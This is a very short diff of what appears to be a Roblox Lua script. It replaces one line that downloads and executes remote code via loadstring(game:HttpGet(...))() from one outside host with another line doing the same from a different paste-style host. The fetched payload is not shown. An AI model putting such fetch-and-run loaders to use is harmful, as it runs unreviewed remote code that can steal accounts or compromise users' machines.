@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("http://redyn.my/Red/Loader/3b99460d54.lua"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/h8O7ZDXaqj0BgNPo/raw", true))()
 
 task.wait(1)
 
